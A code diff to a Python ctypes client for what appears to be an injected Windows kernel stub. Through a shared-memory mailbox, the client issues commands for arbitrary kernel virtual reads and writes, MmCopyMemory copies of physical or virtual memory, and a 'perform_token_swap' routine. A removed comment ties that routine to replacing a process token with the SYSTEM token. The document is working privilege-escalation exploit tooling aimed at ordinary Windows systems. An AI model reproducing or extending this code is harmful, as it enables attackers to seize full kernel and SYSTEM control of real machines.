@@ -17,8 +17,10 @@ class NandoClient:
         self.OFF_STATUS = 0x04
         self.OFF_ARG1 = 0x10
         self.OFF_ARG2 = 0x18
-        self.OFF_RESULT = 0x20
-        self.OFF_HEARTBEAT = 0x30
+        self.OFF_ARG3 = 0x20
+        self.OFF_ARG4 = 0x28
+        self.OFF_RESULT = 0x30
+        self.OFF_HEARTBEAT = 0x40
         
         self.kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
         self.h_driver = None
@@ -49,13 +51,15 @@ class NandoClient:
         val = ctypes.c_ubyte.from_address(self.mailbox_va + self.OFF_HEARTBEAT).value
         return val
 
-    def send_command(self, cmd_id, arg1=0, arg2=0, timeout=1.0):
+    def send_command(self, cmd_id, arg1=0, arg2=0, arg3=0, arg4=0, timeout=1.0):
         # 1. Clear status
-        ctypes.c_uint32.from_address(self.mailbox_va + self.OFF_STATUS).value = 1 # Busy/Wait
+        ctypes.c_uint32.from_address(self.mailbox_va + self.OFF_STATUS).value = 0xBAADF00D
         
         # 2. Write arguments
         ctypes.c_uint64.from_address(self.mailbox_va + self.OFF_ARG1).value = arg1
         ctypes.c_uint64.from_address(self.mailbox_va + self.OFF_ARG2).value = arg2
+        ctypes.c_uint64.from_address(self.mailbox_va + self.OFF_ARG3).value = arg3
+        ctypes.c_uint64.from_address(self.mailbox_va + self.OFF_ARG4).value = arg4
         
         # 3. Write command ID
         ctypes.c_uint32.from_address(self.mailbox_va + self.OFF_CMD).value = cmd_id
@@ -71,21 +75,22 @@ class NandoClient:
             
         raise Exception("[-] Command timed out")
 
-    def write_virtual(self, target_kva, value):
+    def safe_copy(self, destination, source, size, is_physical=False):
         """
-        Uses Command 0x02 in the kernel stub to perform a virtual memory write.
-        target_kva: The KVA of the memory to write to.
-        value: The 64-bit value to write.
+        Uses Command 0x04 (MmCopyMemory) for elite-level safe memory copying.
+        is_physical: If True, treats source as a physical address (Flag 1).
         """
-        print(f"[*] Executing Write Virtual Command (Kernel Side)...")
-        print(f"[*] Target KVA: 0x{target_kva:X}")
-        print(f"[*] Value: 0x{value:X}")
+        flags = 1 if is_physical else 2
+        print(f"[*] Dispatching MmCopyMemory command...")
+        print(f"[*] Dest: 0x{destination:X} | Src: 0x{source:X} | Size: {size}")
         
-        status, _ = self.send_command(2, target_kva, value)
+        status, transferred = self.send_command(4, destination, source, size, flags)
         if status == 0:
-            print("[+] Kernel command SUCCESS!")
+            print(f"[+] Copy Successful! Transferred: {transferred} bytes")
+            return True
         else:
-            print(f"[-] Kernel command FAILED with status: {status}")
+            print(f"[-] MmCopyMemory FAILED with NTSTATUS: 0x{status:X}")
+            return False
 
     def perform_token_swap(self, target_kva, system_token):
         """
@@ -103,27 +108,26 @@ class NandoClient:
         else:
             print(f"[-] Kernel command FAILED with status: {status}")
 
+    def write_virtual(self, target_kva, value):
+        """
+        Uses Command 0x02 in the kernel stub to perform a virtual memory write.
+        """
+        status, _ = self.send_command(2, target_kva, value)
+        return status == 0
+
+    def read_virtual(self, target_kva):
+        """
+        Uses Command 0x01 in the kernel stub to perform a virtual memory read.
+        """
+        status, val = self.send_command(1, target_kva)
+        if status == 0: return val
+        return None
+
 if __name__ == "__main__":
-    # Example Usage
     client = NandoClient()
     try:
         client.connect()
-        
         hb = client.read_heartbeat()
-        print(f"[*] Current Heartbeat: 0x{hb:X}")
-        if hb != 0x77:
-            print("[-] Heartbeat check failed! Is the stub injected?")
-            sys.exit(1)
-            
-        # These values would come from our previous diagnostics (surgical_swap_fresh.py)
-        # Note: We need a KVA for the kernel stub to work. 
-        # In a real scenario, we'd use find_kernel_exports.py to get MmMapIoSpace
-        # and then we could pass a Physical Address. 
-        # For now, this demo assumes we have a KVA.
-        
-        # TARGET_TOKEN_KVA = 0x...
-        # SYSTEM_TOKEN = 0xFFFFB2866026D953
-        # client.perform_token_swap(TARGET_TOKEN_KVA, SYSTEM_TOKEN)
-        
+        print(f"[*] Heartbeat: 0x{hb:X}")
     except Exception as e:
         print(f"[-] Error: {e}")
